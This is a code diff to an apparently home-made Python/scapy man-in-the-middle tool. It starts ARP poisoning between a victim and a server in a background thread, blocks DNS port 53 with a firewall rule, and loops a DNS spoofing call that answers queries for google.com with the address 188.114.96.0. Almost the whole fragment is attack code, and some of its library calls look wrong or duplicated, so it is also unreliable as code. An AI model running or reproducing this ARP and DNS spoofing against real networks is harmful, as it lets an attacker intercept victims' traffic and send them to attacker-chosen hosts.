@@ -1,7 +1,7 @@
 from scapy.all import *
 import threading
 import ArpPoison
-import pyptables
+from pyptables.rules import Reject
 # TODO Fix For IPv6
 # Integrate as MIM attack
 # Fix crashing problem when DNSQR not detected
@@ -55,12 +55,13 @@ def MIMspoofDNS(pkt, goodSite, evilSite) :
     
 def main() :
     pktCounter = 0
-    reject = pyptables.Reject(proto='tcp', dport='53')
+    reject = Reject(proto='udp', dport='53')
     arpThread = threading.Thread(target=ArpPoison.MIMspoofARP, args=(ipVictim, ipServer), daemon=True)
     arpThread.start()
     while True: 
         try:
-            scapy.dns_spoof(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
+            scapy.layers.dns.DNS_am(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
+            dns_spoof(joker="188.114.96.0", match='google.com', from_ip='192.168.178.144')
             pktCounter = pktCounter + 1
             print('Intercepted packets: ' + str(pktCounter) )
         except KeyboardInterrupt:
